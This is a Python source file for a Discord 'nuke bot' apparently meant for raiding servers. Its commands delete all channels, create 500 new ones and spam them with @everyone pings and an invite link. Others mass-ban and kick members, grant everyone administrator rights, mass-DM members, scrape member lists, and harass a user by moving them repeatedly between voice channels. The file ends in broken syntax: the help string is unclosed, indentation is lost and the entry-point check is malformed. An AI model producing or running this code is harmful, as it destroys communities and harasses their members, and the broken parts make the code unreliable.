import discord
from discord.ext import commands
import asyncio
import aiohttp
import os

def get_token():
    token = os.getenv("DISCORD_TOKENS", "").strip().splitlines()[0].strip()
    if not token:
        raise RuntimeError("DISCORD_TOKENS not set")
    return token

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"[+] Bot {bot.user} is online and ready.")

@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    # Delete all channels
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)

    # Create up to 500 channels in batches
    created_channels = []
    async def create_channel(i):
        try:
            return await guild.create_text_channel(f"nuked-{i}")
        except:
            return None

    for i in range(0, 500, 20):
        batch = [create_channel(j) for j in range(i, min(i+20, 500))]
        results = await asyncio.gather(*batch, return_exceptions=True)
        for ch in results:
            if ch:
                created_channels.append(ch)

    # Spam 50 pings per channel
    spam_text = "# Server fucked by trapstar join https://discord.gg/MXEb5Mdy3G @everyone"
    async def spam_channel(ch):
        for _ in range(50):
            try:
                await ch.send(spam_text)
            except:
                pass

    spam_tasks = [spam_channel(ch) for ch in created_channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)
    print(f"[+] Nuke complete: {len(created_channels)} channels spammed.")

@bot.command(name="massban")
async def massban(ctx):
    guild = ctx.guild
    members = [m for m in guild.members if m != guild.me and guild.me.top_role > m.top_role]
    for i in range(0, len(members), 200):
        batch = members[i:i+200]
        await guild.bulk_ban(batch)
    await ctx.send(f"Banned {len(members)} members.")

@bot.command(name="masskick")
async def masskick(ctx):
    guild = ctx.guild
    for m in guild.members:
        if m != guild.me:
            try: await m.kick()
            except: pass
    await ctx.send("Mass kick completed.")

@bot.command(name="massunban")
async def massunban(ctx):
    bans = await ctx.guild.bans()
    for ban in bans:
        try: await ctx.guild.unban(ban.user)
        except: pass
    await ctx.send("Unbanned all.")

@bot.command(name="delchannels")
async def delchannels(ctx):
    await asyncio.gather(*[ch.delete() for ch in ctx.guild.channels], return_exceptions=True)
    await ctx.send("All channels deleted.", delete_after=3)

@bot.command(name="createchans")
async def createchans(ctx, name, amount: int):
    for i in range(0, amount, 20):
        batch = [ctx.guild.create_text_channel(f"{name}-{j}") for j in range(i, min(i+20, amount))]
        await asyncio.gather(*batch, return_exceptions=True)
    await ctx.send(f"Created {amount} channels.")

@bot.command(name="renameall")
async def renameall(ctx, name):
    for ch in ctx.guild.channels:
        try: await ch.edit(name=name)
        except: pass
    await ctx.send("Renamed all channels.")

@bot.command(name="nukechannel")
async def nukechannel(ctx, channel_id):
    ch = ctx.guild.get_channel(int(channel_id))
    if ch: await ch.delete()
    new_ch = await ctx.guild.create_text_channel("nuked")
    for _ in range(30):
        await new_ch.send("GET NUKED @everyone")

@bot.command(name="spam")
async def spam(ctx, amount: int, *, message):
    for _ in range(amount):
        await ctx.send(message)

@bot.command(name="webhookspam")
async def webhookspam(ctx, webhook_url, amount: int, *, message):
    async with aiohttp.ClientSession() as s:
        for _ in range(amount):
            await s.post(webhook_url, json={"content": message})

@bot.command(name="lockdown")
async def lockdown(ctx):
    for ch in ctx.guild.text_channels:
        await ch.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("Locked down.")

@bot.command(name="unlockall")
async def unlockall(ctx):
    for ch in ctx.guild.text_channels:
        await ch.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("Unlocked.")

@bot.command(name="massping")
async def massping(ctx, amount: int):
    role = await ctx.guild.create_role(name="PING", mentionable=True)
    for m in ctx.guild.members:
        if m != ctx.guild.me:
            try: await m.add_roles(role)
            except: pass
    for ch in ctx.guild.text_channels[:5]:
        for _ in range(amount):
            await ch.send(f"{role.mention} @everyone GET PINGED")
    await ctx.send("Mass ping done.")

@bot.command(name="ghostping")
async def ghostping(ctx):
    for ch in ctx.guild.text_channels:
        msg = await ch.send("@everyone")
        await msg.delete()

@bot.command(name="delroles")
async def delroles(ctx):
    for role in ctx.guild.roles:
        if role.is_default() or role.managed or role >= ctx.guild.me.top_role:
            continue
        try: await role.delete()
        except: pass
    await ctx.send("Roles deleted.")

@bot.command(name="createroles")
async def createroles(ctx, name, amount: int):
    for i in range(amount):
        await ctx.guild.create_role(name=f"{name}-{i}")

@bot.command(name="massrole")
async def massrole(ctx, role_name):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
        for m in ctx.guild.members:
            if m != ctx.guild.me:
                try: await m.add_roles(role)
                except: pass

@bot.command(name="removerole")
async def removerole(ctx, role_name):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
        for m in ctx.guild.members:
            if m != ctx.guild.me:
                try: await m.remove_roles(role)
                except: pass

@bot.command(name="adminall")
async def adminall(ctx):
    role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
    for m in ctx.guild.members:
        if m != ctx.guild.me:
            try: await m.add_roles(role)
            except: pass

@bot.command(name="delemojis")
async def delemojis(ctx):
    for emoji in ctx.guild.emojis:
        try: await emoji.delete()
        except: pass

@bot.command(name="delstickers")
async def delstickers(ctx):
    for sticker in ctx.guild.stickers:
        try: await sticker.delete()
        except: pass

@bot.command(name="emojicreate")
async def emojicreate(ctx, name, url):
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as resp:
            if resp.status == 200:
                img = await resp.read()
                await ctx.guild.create_custom_emoji(name=name, image=img)

@bot.command(name="massdm")
async def massdm(ctx, *, message):
    for m in ctx.guild.members:
        if m != ctx.guild.me and not m.bot:
            try: await m.send(message)
            except: pass

@bot.command(name="scrape")
async def scrape(ctx):
    data = {
        "name": ctx.guild.name,
        "id": ctx.guild.id,
        "channels": {str(c.id): c.name for c in ctx.guild.channels},
        "roles": {str(r.id): r.name for r in ctx.guild.roles},
        "members": {str(m.id): str(m) for m in ctx.guild.members}
    }
    with open(f"scrape_{ctx.guild.id}.json", "w") as f:
        import json
        json.dump(data, f, indent=2)
    await ctx.send("Scraped data saved.")

@bot.command(name="selfdestruct")
async def selfdestruct(ctx):
    await ctx.guild.leave()

@bot.command(name="servericon")
async def servericon(ctx, url):
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as resp:
            if resp.status == 200:
                icon = await resp.read()
                await ctx.guild.edit(icon=icon)

@bot.command(name="servername")
async def servername(ctx, *, name):
    await ctx.guild.edit(name=name)

@bot.command(name="prune")
async def prune(ctx, days: int):
    await ctx.guild.prune_members(days=days)

@bot.command(name="invitecreate")
async def invitecreate(ctx, amount: int):
    for ch in ctx.guild.text_channels:
        for _ in range(amount):
            await ch.create_invite()

@bot.command(name="invitedelete")
async def invitedelete(ctx):
    invites = await ctx.guild.invites()
    for inv in invites:
        await inv.delete()

@bot.command(name="webhookcreate")
async def webhookcreate(ctx, channel_id, name):
    ch = bot.get_channel(int(channel_id))
    if ch:
        await ch.create_webhook(name=name)

@bot.command(name="toggleperms")
async def toggleperms(ctx, channel_id, role_id, perms: int):
    ch = ctx.guild.get_channel(int(channel_id))
    role = ctx.guild.get_role(int(role_id))
    if ch and role:
        overwrite = ch.overwrites_for(role)
        new_perms = discord.Permissions(perms)
        overwrite.update(**dict(new_perms))
        await ch.set_permissions(role, overwrite=overwrite)

@bot.command(name="massreact")
async def massreact(ctx, channel_id, message_id, emoji):
    ch = bot.get_channel(int(channel_id))
    if ch:
        msg = await ch.fetch_message(int(message_id))
        for _ in range(100):
            await msg.add_reaction(emoji)

@bot.command(name="voicemove")
async def voicemove(ctx, user_id, channel_id):
    member = ctx.guild.get_member(int(user_id))
    ch = ctx.guild.get_channel(int(channel_id))
    if member and ch and member.voice:
        for _ in range(100):
            await member.move_to(ch)
            await asyncio.sleep(0.5)
    else:
        await ctx.send("User not in voice or invalid channel.")

@bot.command(name="help")
async def help_cmd(ctx):
    help_text = """
**🖤 TRAPSTAR NUKE BOT COMMANDS**
```diff
!nuke           → Destroy everything, create 500 channels, spam pings
!massban        → Ban all members
!masskick       → Kick all members
!massunban      → Unban everyone
!delchannels    → Delete all channels
!createchans <name> <amount> → Create channels
!renameall <name> → Rename everything
!nukechannel <id> → Nuke a single channel
!spam <amount> <msg> → Spam current channel
!webhookspam <url> <amount> <msg> → Webhook spam
!lockdown       → Make all channels read-only
!unlockall      → Revert lockdown
!massping <amount> → Ping everyone via role
!ghostping      → Ghost ping @everyone
!delroles       → Delete all roles
!createroles <name> <amount> → Create roles
!massrole <name> → Assign role to all
!removerole <name> → Remove role from all
!adminall       → Give everyone admin
!delemojis      → Delete all emojis
!delstickers    → Delete all stickers
!emojicreate <name> <url> → Create emoji
!massdm <msg>   → DM all members
!scrape         → Save server info
!selfdestruct   → Bot leaves server
!servericon <url> → Change server icon
!servername <name> → Rename server
!prune <days>   → Prune members
!invitecreate <amount> → Create invites
!invitedelete   → Delete all invites
!webhookcreate <ch_id> <name> → Create webhook
!toggleperms <ch_id> <role_id> <perms> → Toggle perms
!massreact <ch_id> <msg_id> <emoji> → React flood
!voicemove <user_id> <ch_id> → Move user 100 times
"""
await ctx.send(help_text)

if name == "main":
TOKEN = get_token()
bot.run(TOKEN)
